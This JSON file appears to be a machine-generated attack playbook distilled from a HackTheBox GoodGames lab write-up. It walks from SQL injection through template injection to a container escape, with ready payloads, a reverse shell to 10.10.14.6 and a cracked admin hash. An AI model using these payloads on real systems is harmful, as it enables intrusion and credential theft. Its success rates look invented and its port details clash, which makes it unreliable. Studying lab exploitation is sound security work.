@@ -1,0 +1,997 @@
+{
+  "writeup_id": "Htb_Goodgames",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_sqli_to_docker_escape",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "http+ssh",
+    "os_family": "linux",
+    "environment_type": "containerized_web_application",
+    "entry_vector": "sql_injection",
+    "privilege_path": "sqli_to_ssti_to_container_escape",
+    "attack_complexity": "medium",
+    "estimated_time": "90-120 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "werkzeug_python_stack",
+      "docker_container_environment",
+      "mounted_home_directory",
+      "password_reuse_across_services"
+    ],
+    "environmental_clues": [
+      "single_http_port_exposed",
+      "python_flask_application",
+      "user_registration_functionality",
+      "virtual_host_discovery"
+    ],
+    "similar_scenarios": [
+      "valentine_htb_easy",
+      "node_htb_medium"
+    ],
+    "unique_aspects": [
+      "union_based_sqli_to_credential_dump",
+      "server_side_template_injection_in_profile",
+      "docker_host_privilege_escalation",
+      "file_permission_abuse_via_mounted_volumes"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SQL_Injection_Login_Bypass",
+        "success_reason": "Login form vulnerable to SQL injection with no input validation",
+        "prerequisite_indicators": [
+          "web_application_with_login",
+          "database_backend_present",
+          "no_input_sanitization"
+        ],
+        "recognition_patterns": [
+          "login form accepts email/password",
+          "python/mysql backend stack",
+          "no client-side validation bypass protection"
+        ],
+        "failure_modes": [
+          "prepared_statements_used",
+          "input_validation_present",
+          "web_application_firewall"
+        ],
+        "environmental_factors": [
+          "python_mysql_connector_behavior",
+          "werkzeug_development_server",
+          "no_security_hardening"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "SSTI_Server_Side_Template_Injection",
+        "success_reason": "Profile name field processes template syntax without sanitization",
+        "prerequisite_indicators": [
+          "authenticated_user_input_fields",
+          "template_engine_backend",
+          "user_controlled_data_reflection"
+        ],
+        "recognition_patterns": [
+          "flask/jinja2 template engine",
+          "user input reflected in responses",
+          "template syntax not escaped"
+        ],
+        "failure_modes": [
+          "template_auto_escaping_enabled",
+          "input_sanitization_present",
+          "sandboxed_template_environment"
+        ],
+        "environmental_factors": [
+          "flask_development_configuration",
+          "docker_container_environment",
+          "insufficient_input_validation"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "Password_Reuse_SSH_Access",
+        "success_reason": "Database password reused for SSH authentication on host system",
+        "prerequisite_indicators": [
+          "database_credentials_obtained",
+          "ssh_service_available",
+          "weak_password_policies"
+        ],
+        "recognition_patterns": [
+          "same_username_across_systems",
+          "common_password_patterns",
+          "service_account_credentials"
+        ],
+        "failure_modes": [
+          "unique_passwords_per_service",
+          "ssh_key_authentication_only",
+          "account_lockout_policies"
+        ],
+        "environmental_factors": [
+          "poor_credential_management",
+          "shared_development_environment",
+          "insufficient_access_controls"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "5-10 minutes"
+      },
+      {
+        "technique": "Docker_Mount_Privilege_Escalation",
+        "success_reason": "Host home directory mounted into container with preserved permissions",
+        "prerequisite_indicators": [
+          "docker_container_environment",
+          "host_directories_mounted",
+          "file_permission_misconfigurations"
+        ],
+        "recognition_patterns": [
+          "shared_filesystem_between_container_host",
+          "uid_mapping_vulnerabilities",
+          "writable_mounted_directories"
+        ],
+        "failure_modes": [
+          "proper_user_namespace_isolation",
+          "read_only_mounts",
+          "restricted_container_capabilities"
+        ],
+        "environmental_factors": [
+          "docker_default_configurations",
+          "development_environment_setup",
+          "insufficient_container_hardening"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "20-40 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "SQL injection in login form",
+        "discovery_method": "Manual testing of authentication bypass",
+        "why_critical": "Bypassed authentication and enabled data extraction",
+        "how_to_recognize": [
+          "login forms with database backends",
+          "python mysql connector behavior",
+          "lack of prepared statements"
+        ],
+        "follow_up_actions": [
+          "attempt_union_injection",
+          "extract_database_credentials",
+          "enumerate_user_accounts"
+        ]
+      },
+      {
+        "discovery": "Internal virtualhost admin panel",
+        "discovery_method": "Database credential dump revealed new subdomain",
+        "why_critical": "Provided additional attack surface with SSTI vulnerability",
+        "how_to_recognize": [
+          "references_to_additional_hostnames",
+          "admin_panel_indicators",
+          "different_authentication_requirements"
+        ],
+        "follow_up_actions": [
+          "add_to_hosts_file",
+          "test_extracted_credentials",
+          "enumerate_admin_functionality"
+        ]
+      },
+      {
+        "discovery": "Server-side template injection in profile",
+        "discovery_method": "Testing template syntax in user input fields",
+        "why_critical": "Enabled remote code execution in container environment",
+        "how_to_recognize": [
+          "flask_jinja2_template_engine",
+          "user_input_reflection",
+          "template_syntax_processing"
+        ],
+        "follow_up_actions": [
+          "test_code_execution_payloads",
+          "establish_reverse_shell",
+          "enumerate_container_environment"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated_web_user",
+        "escalation_method": "SQL_injection_to_admin_bypass",
+        "why_possible": "No input validation on authentication form",
+        "recognition_signs": [
+          "database_driven_authentication",
+          "injectable_sql_parameters",
+          "python_mysql_backend"
+        ],
+        "exploitation_path": "SQL injection → Admin bypass → Database dump → Credentials"
+      },
+      {
+        "privilege_level": "authenticated_web_user",
+        "escalation_method": "SSTI_to_container_shell",
+        "why_possible": "Template engine processes user input without sanitization",
+        "recognition_signs": [
+          "flask_application_stack",
+          "user_input_in_templates",
+          "jinja2_template_engine"
+        ],
+        "exploitation_path": "SSTI payload → Code execution → Reverse shell → Container root"
+      },
+      {
+        "privilege_level": "container_root",
+        "escalation_method": "mount_escape_to_host_root",
+        "why_possible": "Host directories mounted with preserved permissions and UID mapping issues",
+        "recognition_signs": [
+          "shared_filesystems_detected",
+          "uid_permission_mismatches",
+          "writable_host_directories"
+        ],
+        "exploitation_path": "Container shell → Mount enumeration → UID manipulation → Host root access"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Only port 80 open on target host",
+        "decision": "Focus on web application enumeration and vulnerability assessment",
+        "reasoning": "Single port suggests web-only attack surface, concentrate efforts on web vulnerabilities",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "udp_scan",
+            "when": "if web enumeration fails"
+          },
+          {
+            "option": "subdomain_enumeration",
+            "when": "always run in parallel"
+          }
+        ],
+        "success_indicators": [
+          "web_application_accessible",
+          "technology_stack_identified",
+          "additional_endpoints_found"
+        ],
+        "next_decision": "identify_web_vulnerabilities"
+      },
+      {
+        "step": 2,
+        "situation": "Found login form with email validation",
+        "decision": "Test for SQL injection in authentication bypass",
+        "reasoning": "Login forms are high-value targets for SQLi, can lead to authentication bypass and data extraction",
+        "confidence": 0.85,
+        "prerequisites": [
+          "login_form_identified",
+          "request_intercepted"
+        ],
+        "success_indicators": [
+          "authentication_bypassed",
+          "error_messages_reveal_sqli"
+        ],
+        "failure_fallbacks": [
+          "credential_stuffing",
+          "registration_form_testing",
+          "password_reset_testing"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "SQL injection confirmed with authentication bypass",
+        "decision": "Escalate to UNION-based injection for data extraction",
+        "reasoning": "Data reflection in welcome message indicates potential for UNION injection to dump database",
+        "confidence": 0.9,
+        "prerequisites": [
+          "sqli_confirmed",
+          "data_reflection_observed"
+        ],
+        "success_indicators": [
+          "column_count_determined",
+          "database_structure_mapped",
+          "credentials_extracted"
+        ],
+        "next_decision": "crack_extracted_hashes"
+      },
+      {
+        "step": 4,
+        "situation": "Admin credentials obtained from database dump",
+        "decision": "Enumerate for additional admin interfaces and subdomains",
+        "reasoning": "Admin credentials often provide access to administrative panels on different subdomains",
+        "confidence": 0.8,
+        "prerequisites": [
+          "admin_credentials_cracked"
+        ],
+        "success_indicators": [
+          "admin_panel_discovered",
+          "additional_subdomain_found"
+        ],
+        "next_decision": "test_admin_functionality"
+      },
+      {
+        "step": 5,
+        "situation": "Access to admin panel with user profile functionality",
+        "decision": "Test for Server-Side Template Injection in user input fields",
+        "reasoning": "Python/Flask applications commonly vulnerable to SSTI, profile fields often process user input through templates",
+        "confidence": 0.75,
+        "prerequisites": [
+          "admin_panel_access",
+          "user_input_fields_identified"
+        ],
+        "success_indicators": [
+          "template_injection_confirmed",
+          "code_execution_achieved"
+        ],
+        "failure_fallbacks": [
+          "file_upload_testing",
+          "command_injection_testing",
+          "xss_testing"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_sqli_succeeds": {
+        "action": "extract_all_database_contents",
+        "tools": [
+          "burp_repeater",
+          "sqlmap"
+        ],
+        "next_phase": "credential_cracking_and_lateral_movement"
+      },
+      "if_sqli_fails": {
+        "action": "try_alternative_web_attacks",
+        "alternatives": [
+          "xss_testing",
+          "file_upload_testing",
+          "directory_traversal"
+        ],
+        "decision_criteria": "based_on_application_functionality"
+      },
+      "if_admin_access_obtained": {
+        "action": "enumerate_admin_functionality",
+        "purpose": "find_code_execution_opportunities",
+        "tools": [
+          "burp_suite",
+          "manual_testing"
+        ]
+      },
+      "if_ssti_confirmed": {
+        "action": "escalate_to_reverse_shell",
+        "tools": [
+          "python_reverse_shell_payloads"
+        ],
+        "next_phase": "container_escape_enumeration"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_login_forms_for_sqli_first",
+        "reasoning": "high_success_rate_and_immediate_privilege_escalation",
+        "applicability": "web_applications_with_authentication"
+      },
+      {
+        "rule": "escalate_sqli_to_union_injection_when_data_reflected",
+        "reasoning": "maximizes_data_extraction_potential",
+        "applicability": "confirmed_sqli_with_output_reflection"
+      },
+      {
+        "rule": "test_ssti_in_python_applications_with_user_input",
+        "reasoning": "common_vulnerability_in_flask_applications",
+        "applicability": "python_web_applications_with_templating"
+      },
+      {
+        "rule": "enumerate_subdomains_after_obtaining_admin_credentials",
+        "reasoning": "admin_panels_often_hosted_on_separate_subdomains",
+        "applicability": "administrative_credentials_obtained"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SQL Injection",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_detected",
+          "database_backend_present",
+          "user_input_fields_exist"
+        ],
+        "success_indicators": [
+          "login_forms_present",
+          "search_functionality_available",
+          "parameter_based_queries",
+          "error_messages_verbose"
+        ],
+        "incompatible_with": [
+          "prepared_statements_only",
+          "input_sanitization_complete",
+          "waf_blocking_payloads"
+        ],
+        "confidence_boosters": [
+          "custom_web_application",
+          "legacy_framework_detected",
+          "multiple_input_vectors"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Server-Side Template Injection",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "template_engine_detected",
+          "user_controlled_template_data",
+          "dynamic_content_generation"
+        ],
+        "success_indicators": [
+          "python_flask_detected",
+          "werkzeug_server_header",
+          "profile_edit_functionality",
+          "template_syntax_accepted"
+        ],
+        "incompatible_with": [
+          "template_sandboxing_enabled",
+          "input_validation_strict",
+          "template_engine_hardened"
+        ],
+        "confidence_boosters": [
+          "flask_jinja2_combination",
+          "user_profile_customization",
+          "dynamic_name_rendering"
+        ],
+        "typical_success_rate": 0.82,
+        "estimated_time": "15-25 minutes"
+      },
+      {
+        "technique": "Password Reuse Attack",
+        "mitre_id": "T1110.004",
+        "required_services": [
+          "ssh",
+          "rdp",
+          "smb"
+        ],
+        "required_ports": [
+          22,
+          3389,
+          445
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "credentials_obtained",
+          "multiple_services_available",
+          "weak_password_policies"
+        ],
+        "success_indicators": [
+          "database_credentials_dumped",
+          "ssh_service_accessible",
+          "same_username_patterns"
+        ],
+        "incompatible_with": [
+          "unique_passwords_enforced",
+          "mfa_required",
+          "account_lockout_strict"
+        ],
+        "confidence_boosters": [
+          "default_configurations",
+          "single_admin_user",
+          "development_environment"
+        ],
+        "typical_success_rate": 0.68,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "Container Escape via Mount",
+        "mitre_id": "T1611",
+        "required_services": [
+          "docker",
+          "container_runtime"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "container_environment_detected",
+          "host_directories_mounted",
+          "privileged_container_access"
+        ],
+        "success_indicators": [
+          "home_directory_mounted",
+          "file_ownership_manipulation",
+          "suid_binary_access"
+        ],
+        "incompatible_with": [
+          "readonly_mounts",
+          "user_namespace_isolation",
+          "selinux_enforcing"
+        ],
+        "confidence_boosters": [
+          "development_container_setup",
+          "shared_filesystem_access",
+          "root_inside_container"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "10-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "python_web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          5000
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Werkzeug",
+          "Python",
+          "Flask",
+          "Django"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "sql_database_backend": {
+        "port_indicators": [
+          3306,
+          5432,
+          1433,
+          1521
+        ],
+        "service_indicators": [
+          "mysql",
+          "postgresql",
+          "mssql",
+          "oracle"
+        ],
+        "technology_indicators": [
+          "login_forms",
+          "user_registration",
+          "data_persistence"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "container_environment": {
+        "port_indicators": [
+          2375,
+          2376
+        ],
+        "service_indicators": [
+          "docker",
+          "containerd"
+        ],
+        "filesystem_indicators": [
+          "/.dockerenv",
+          "/proc/1/cgroup"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "ssh_service": {
+        "port_indicators": [
+          22,
+          2222
+        ],
+        "service_indicators": [
+          "ssh",
+          "openssh"
+        ],
+        "banner_indicators": [
+          "OpenSSH",
+          "SSH-2.0"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "sql_injection",
+          "when": "web_application_with_login_detected",
+          "reason": "high_success_rate_credential_extraction"
+        },
+        {
+          "attack": "ssti_exploitation",
+          "when": "python_template_engine_detected",
+          "reason": "direct_code_execution_possible"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "password_reuse",
+          "when": "credentials_obtained_and_ssh_available",
+          "reason": "common_in_development_environments"
+        },
+        {
+          "attack": "container_escape",
+          "when": "container_environment_confirmed",
+          "reason": "often_misconfigured_in_ctf_environments"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "SQL Injection - Authentication Bypass",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "Burp Suite",
+            "command_template": "Intercept login request and modify email parameter",
+            "actual_command": "email=' or 1=1-- -",
+            "output_pattern": "Login Success page with admin privileges",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "web_application_with_login_form",
+          "mysql_backend_database",
+          "insufficient_input_validation"
+        ],
+        "success_indicators": [
+          "successful_authentication_bypass",
+          "admin_privileges_obtained",
+          "access_to_restricted_functionality"
+        ],
+        "common_failures": [
+          "input_validation_blocks_injection",
+          "prepared_statements_prevent_injection",
+          "web_application_firewall_detection"
+        ],
+        "follow_up_techniques": [
+          "union_based_sql_injection",
+          "database_enumeration",
+          "credential_extraction"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "SQL Injection - UNION Based Data Extraction",
+        "mitre_id": "T1190",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "Manual UNION Injection",
+            "command_template": "' union select 1,2,3,4-- -",
+            "actual_command": "' union select email,password,name,id from user-- -",
+            "output_pattern": "Database contents displayed in application response",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "successful_sql_injection_identified",
+          "union_compatible_query_structure",
+          "column_count_determined"
+        ],
+        "success_indicators": [
+          "database_schema_enumerated",
+          "user_credentials_extracted",
+          "password_hashes_obtained"
+        ],
+        "common_failures": [
+          "incorrect_column_count",
+          "data_type_mismatch",
+          "insufficient_privileges"
+        ],
+        "follow_up_techniques": [
+          "password_hash_cracking",
+          "credential_reuse_testing",
+          "privilege_escalation"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Server-Side Template Injection (SSTI)",
+        "mitre_id": "T1190",
+        "category": "execution",
+        "phase": "execution",
+        "tools_used": [
+          {
+            "name": "Manual SSTI Payload",
+            "command_template": "{{ 7 * 7 }}",
+            "actual_command": "{{ namespace.__init__.__globals__.os.popen('id').read() }}",
+            "output_pattern": "Command output reflected in application response",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "Reverse Shell via SSTI",
+            "command_template": "{{ namespace.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"').read() }}",
+            "actual_command": "{{ namespace.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"').read() }}",
+            "success_factors": [
+              "python_flask_jinja2_template_engine",
+              "unrestricted_template_evaluation"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "user_input_processed_by_template_engine",
+          "insufficient_input_sanitization",
+          "python_flask_application"
+        ],
+        "success_indicators": [
+          "mathematical_expression_evaluated",
+          "system_command_execution_achieved",
+          "reverse_shell_connection_established"
+        ],
+        "common_failures": [
+          "template_sandboxing_enabled",
+          "input_filtering_blocks_payloads",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "container_escape_techniques",
+          "credential_harvesting",
+          "lateral_movement"
+        ],
+        "time_investment": "5-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Password Hash Cracking",
+        "mitre_id": "T1110.002",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "Online Hash Lookup",
+            "command_template": "Search hash in online databases",
+            "actual_command": "Google search for MD5 hash",
+            "output_pattern": "Plaintext password: superadministrator",
+            "effectiveness_rating": 4,
+            "reliability": 0.7
+          }
+        ],
+        "prerequisites": [
+          "password_hashes_extracted",
+          "weak_passwords_used",
+          "common_hash_algorithms"
+        ],
+        "success_indicators": [
+          "hash_successfully_cracked",
+          "plaintext_password_obtained",
+          "credentials_provide_system_access"
+        ],
+        "common_failures": [
+          "strong_password_policy",
+          "uncommon_hash_algorithm",
+          "salted_hashes"
+        ],
+        "follow_up_techniques": [
+          "credential_reuse_testing",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "1-60 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Burp Suite",
+        "use_case": "web_application_security_testing",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "medium",
+        "essential_for": [
+          "web_application_penetration_testing"
+        ],
+        "alternatives": [
+          "OWASP ZAP",
+          "manual_curl_requests"
+        ],
+        "best_practices": [
+          "intercept_all_application_requests",
+          "test_all_input_parameters",
+          "use_repeater_for_payload_refinement"
+        ]
+      },
+      {
+        "tool": "feroxbuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_reconnaissance"
+        ],
+        "alternatives": [
+          "gobuster",
+          "dirbuster",
+          "ffuf"
+        ],
+        "best_practices": [
+          "use_appropriate_wordlists_for_technology",
+          "configure_proper_status_code_filtering",
+          "handle_wildcard_responses_correctly"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "sql_injection_to_admin_access",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Intercept login request in Burp Suite",
+            "purpose": "Capture authentication request",
+            "expected_output": "POST request with email/password parameters"
+          },
+          {
+            "step": 2,
+            "command": "email=' or 1=1-- -",
+            "purpose": "Bypass authentication via SQL injection",
+            "expected_output": "Login Success page with admin privileges"
+          },
+          {
+            "step": 3,
+            "command": "' union select email,password,name,id from user-- -",
+            "purpose": "Extract user credentials from database",
+            "expected_output": "Admin hash: 2b22337f218b2d82dfc3b6f77e7cb8ec"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "10-25 minutes"
+      },
+      {
+        "sequence_name": "ssti_to_root_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "{{ 7 * 7 }}",
+            "purpose": "Test for SSTI vulnerability",
+            "expected_output": "Name field displays: 49"
+          },
+          {
+            "step": 2,
+            "command": "{{ namespace.__init__.__globals__.os.popen('id').read() }}",
+            "purpose": "Achieve command execution",
+            "expected_output": "uid=0(root) gid=0(root) groups=0(root)"
+          },
+          {
+            "step": 3,
+            "command": "{{ namespace.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"').read() }}",
+            "purpose": "Establish reverse shell",
+            "expected_output": "Root shell in Docker container"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "5-15 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "GoodGames",
+      "difficulty": "Easy",
+      "os": "Linux",
+      "platform": "HackTheBox",
+      "release_date": "2022-02-21",
+      "author": "TheCyberGeek",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "beginner_to_intermediate",
+      "primary_attack_vectors": [
+        "sql_injection",
+        "ssti",
+        "docker_escape"
+      ],
+      "key_vulnerabilities": [
+        "union_sql_injection",
+        "server_side_template_injection",
+        "password_reuse",
+        "docker_mount_abuse"
+      ],
+      "environment_type": "web_application_with_containers",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "sql_injection_techniques",
+        "ssti_exploitation",
+        "docker_security",
+        "privilege_escalation"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_security",
+        "sql_injection_basics",
+        "template_engines",
+        "docker_fundamentals"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "sql_injection",
+        "template_injection",
+        "container_security"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation",
+        "container_escape"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "parameterized_queries",
+        "template_sandboxing",
+        "secure_container_configuration"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Shoppy",
+        "Validation",
+        "Previse"
+      ],
+      "similarity_reasons": [
+        "web_vulnerabilities",
+        "sql_injection",
+        "credential_extraction",
+        "docker_containers"
+      ],
+      "unique_aspects": [
+        "ssti_in_profile",
+        "docker_mount_privilege_escalation",
+        "multi_stage_web_exploitation"
+      ],
+      "difficulty_factors": [
+        "multiple_vulnerability_chaining",
+        "container_to_host_escalation",
+        "password_reuse_discovery"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T22:19:02.862940",
+    "original_file": "0xdf_writeups/Htb Goodgames.md",
+    "content_length": 22424,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
